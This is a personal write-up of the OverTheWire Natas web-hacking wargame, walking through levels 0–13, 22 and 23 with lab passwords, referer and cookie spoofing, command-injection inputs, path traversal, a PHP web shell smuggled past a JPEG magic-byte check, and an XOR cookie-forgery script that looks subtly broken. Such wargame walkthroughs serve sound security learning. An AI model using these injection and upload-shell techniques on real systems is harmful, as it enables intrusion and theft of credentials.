---
title: "[OTW] Natas Write-Up"
permalink: /writeups/otw/natas/
layout: single
sidebar:
  nav: natas
---

#### Natas 00 Solution

___
**URL :** <http://natas0.natas.labs.overthewire.org/> \
**Credentials :**

The password for the next level can be found as a comment in the html body.
```html
<body>
    <h1>natas0</h1>
    <div id="content">
        You can find the password for the next level on this page.
        <!--The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
    </div>
</body>
```

#### Natas 01 Solution

___
**URL :** <http://natas1.natas.labs.overthewire.org/> \
**Credentials :** *natas1:0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq*

Right clicking on the page was disabled so we couldn't simply right click and 'inspect element'. Luckily, cmd + shift + u also gives you access to developer tools. Just like the previous level, the password for the next level was in the html body. 
```html
<!--The password for natas2 is TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI-->
```

#### Natas 02 Solution

___
**URL :** <http://natas2.natas.labs.overthewire.org/> \
**Credentials :** *natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI*

This time the password was no longer simply a comment in the html body, but instead we're given an img element. 
```html
<body>
    <h1>natas2</h1>
    <div id="content">
        There is nothing on this page
        <img src="files/pixel.png">
    </div>
</body>
```
Following the src destination, I noticed the url changed to http://natas2.natas.labs.overthewire.org/files/pixel.png which made me wonder if there was anything at http://natas2.natas.labs.overthewire.org/files.

![Index file](/assets/images/02-1.png)

Following users.txt, reveals the password for the next level.
```html
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

#### Natas 03 Solution

___
**URL :** <http://natas3.natas.labs.overthewire.org/> \
**Credentials :** *natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH*

#### Natas 04 Solution

___
**URL :** <http://natas4.natas.labs.overthewire.org/> \
**Credentials :** *natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ*

![Index file](/assets/images/04-1.png)

Looking at the network request, there's a referer header.

![Index file](/assets/images/04-2.png)

So all we needed to do was change it to "http://natas5.natas.labs.overthewire.org/". We can do this with curl and the -e flag which allows us to specify the referer.
```html
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
-e http://natas5.natas.labs.overthewire.org/ \
-u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
```
Which gives
```html
Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
```

#### Natas 05 Solution

___
**URL :** <http://natas5.natas.labs.overthewire.org/> \
**Credentials :** *natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK*

![Index file](/assets/images/05-1.png)

Inspecting the cookies, theres a loggedin cookie with value 0.

![Index file](/assets/images/05-2.png)

Changing it to 1 and then refreshing the page produces the password for the next level.

![Index file](/assets/images/05-3.png)

#### Natas 06 Solution

___
**URL :** <http://natas6.natas.labs.overthewire.org/> \
**Credentials :** *natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned*

All we are given is an input box and the source code.
```php
<?
include "includes/secret.inc";
if (array_key_exists("submit", $_POST)) {
    if ($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```
Analysing the source code, I wondered if there was anything at http://natas6.natas.labs.overthewire.org/includes/secret.inc/
```html
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Now all we needed to do was pass in the secret to obtain the password for the next level.

![Index file](/assets/images/06-1.png)

#### Natas 07 Solution

___
**URL :** <http://natas7.natas.labs.overthewire.org/> \
**Credentials :** *natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS*

All we are given is a link to the 'Home' and 'About' page.

![Index file](/assets/images/06-1.png)

After navigating to the 'About' page, I noticed that it makes a GET request with 'About' as a query parameter. 

![Index file](/assets/images/07-2.png)

Passwords are stored at /etc/natas_webpass/natasX so changing the query parameter to /etc/natas_webpass/natas8 gives us the password for level 8.

![Index file](/assets/images/07-3.png)

#### Natas 08 Solution

___
**URL :** <http://natas8.natas.labs.overthewire.org/> \
**Credentials :** *natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q*

Again, we're only given an input box and the source code. However, the secret is hardcoded into the file AND we're also given the encoding process.
```php
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if (array_key_exists("submit", $_POST)) {
    if (encodeSecret($_POST['secret']) == $encodedSecret) {
        print "Access granted. The password for natas9 is <censored>";
    } else {
        print "Wrong secret";
    }
}
?>
```
Reversing the encoding process gives us the following secret:

![Index file](/assets/images/08-1.png)

Finally, entering the secret gives us the password for the next level.

![Index file](/assets/images/08-2.png)

#### Natas 09 Solution
___
**URL :** <http://natas9.natas.labs.overthewire.org/> \
**Credentials :** *natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t*

```php
<?
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
The passthru() function works like execv(). I confirmed this by attempting to chain multiple shell commands

![Index file](/assets/images/09-1.png)

Recall, passwords are stored at /etc/natas_webpass/natasX so we can simply use the 'cat' command:

![Index file](/assets/images/09-2.png)

#### Natas 10 Solution

___
**URL :** <http://natas10.natas.labs.overthewire.org/> \
**Credentials :** *natas10:t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu*

Unlike the previous level, certain characters are now filtered. Our previous method of chaining shell commands will not work anymore.
```php
<?
$key = "";

if (array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if ($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

The key to this level is through cleverly choosing the regex pattern for the grep command. Recall, the following regex pattern:
```html
.*
```
This pattern matches any string. Every argument after the pattern provided are the files grep actually checks against the pattern. All we need to do now is add /etc/natas_webpass/natas11 to the list of files grep needs to check. So the following payload:
```html
.* /etc/natas_webpass/natas11
```
gets evaluated as
```html
grep -i .* /etc/natas_webpass/natas11 dictionary.txt
```
giving us

![Index file](/assets/images/10-1.png)

#### Natas 11 Solution

___
**URL :** <http://natas11.natas.labs.overthewire.org/> \
**Credentials :** *natas11:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk*

We are told that "Cookies are protected with XOR encryption" which indicates some cookie manipulation to get the password.

![Index file](/assets/images/11-1.png)

Since we are given the source code, the first thing I analysed was the condition required to get the password:
```php
<?
if ($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```
However, by default showpassword is false:
```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
```

So our goal is to encode the following:
```php
array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")
```

Luckily, we have access to the encoding used:
```php
base64_encode(xor_encrypt(json_encode($d)))
```

However, xor_encrypt() is a custom encoding and there's no in-built xor_decrypt. We also aren't provided the secret key used for the encryption and we can't just a random key since the same key is used for both encryption and decryption.
```php
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
```

As a reminder, here is the XOR encryption formula:
```html
plain_text XOR key = cipher_text
```
The key here is recognising that XOR encryption is a symmetrical function, meaning:
```html
cipher_text XOR key = plain_text
```
but more importantly:
```html
plain_text XOR cipher_text = key
```

We have all we need and the following script produces the encoding we will use to replace the default cookie assigned to us:
```php
$payload = array("showpassword"=>"yes", "bgcolor"=>"#ffffff");
$plain_text = array("showpassword"=>"no", "bgcolor"=>"#ffffff");
$cipher_text = 'HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg';

function xor_encrypt($in) {
    $key = $plain_text ^ $cipher_text;
    $text = $in;
    $outText = '';

    // Iterate through each character
    for ($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

json_decode(xor_encrypt(base64_decode($payload)), true);
```

#### Natas 12 Solution

___
**URL :** <http://natas12.natas.labs.overthewire.org/> \
**Credentials :** *natas12:UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk*

I first tried uploading a malicious php file that tries to print the contents of /etc/natas_webpass/natas13:
```html
system("cat /etc/natas_webpass/natas13")
```

![Index file](/assets/images/12-1.png)

For some reason, even though we uploaded a php file, the server stores it as a jpg file:

![Index file](/assets/images/12-2.png)

Analysing the html, the value for the uploaded_file has already been determined so it will always be received by the server as a .jpg file when uploaded:
```html
<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="MAX_FILE_SIZE" value="1000"/>
    <input type="hidden" name="filename" value="ver2183tf6.jpg"/>

    Choose a JPEG to upload (max 1KB):
    <br/>
    <input name="uploadedfile" type="file"/>
    <br/>
    <input type="submit" value="Upload File"/>
</form>
```
The trick is to manually modify the html so that value attribute is a php file.
```html
<input type="hidden" name="filename" value="ver2183tf6.php">
```
As you can see, now it is being stored on the server as a php file:

![Index file](/assets/images/12-3.png)

Following the link executes the code since it is treated as a php file, showing us a page with just the password:
```html
trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```

#### Natas 13 Solution

___
**URL :** <http://natas13.natas.labs.overthewire.org/> \
**Credentials :** *natas13:trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC*

Unlike the previous level, the file will be checked that is a jpg file before being uploaded:

![Index file](/assets/images/13-1.png)

The actual check is being done by the following php function which essentially checks the first few bytes of the file:
```php
exif_imagetype($_FILES['uploadedfile']['tmp_name'])
```
Spoofing the file to begin with the signature of a JPG file and then adding our payload after did the trick. We will use python since we need to write raw bytes: 
```py
fh = open('shell.php', 'wb')
fh.write(b'\xFF\xD8\xFF\xE0' + b'<? system("cat /etc/natas_webpass/natas14") ?>')
fh.close()
```
After also doing everything we did in the previous level, we get the password:
```html
z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ
```

#### Natas 22 Solution

___

```php
<?php
session_start();

if (array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if (!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
      header("Location: /");
    }
}
?>
```

```php
<?php
if (array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
}
?>
```

```curl -u natas22:d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz 'http://natas22.natas.labs.overthewire.org/index.php?revelio'```

#### Natas 23 Solution

```php
<?php
if (array_key_exists("passwd",$_REQUEST)) {
    if (strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )) {
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas24 Password: <censored></pre>";
    } else {
        echo "<br>Wrong!<br>";
    }
}
// morla / 10111
?>
```
Had to search up what strstr did
Tried xxiloveyouxx
Assumed the input had to be > 10 characters in length
15iloveyou